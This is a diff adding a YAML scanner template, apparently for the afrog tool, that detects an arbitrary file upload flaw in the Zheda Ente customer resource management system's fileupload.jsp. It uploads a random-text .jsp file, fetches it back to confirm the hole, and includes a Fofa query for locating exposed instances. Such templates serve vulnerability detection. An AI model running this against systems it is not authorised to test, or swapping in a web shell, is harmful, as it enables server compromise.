@@ -1,0 +1,30 @@
+id: zheda-ente-entsoft-en-fileupload
+
+info:
+  name: 浙大恩特客户资源管理系统fileupload.jsp接口任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    Fofa: title="欢迎使用浙大恩特客户资源管理系统"
+  reference:
+    - https://mp.weixin.qq.com/s/kK4D6A09c4XzLhEsXWRMQA
+  tags: zheda,fileupload
+  created: 2024/02/26
+
+set:
+  filename: randomInt(100000, 999999)
+  randbody: randomLowercase(16)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{filename}}.jsp
+      body: "{{randbody}}"
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /enterdoc/uploadfile/{{filename}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
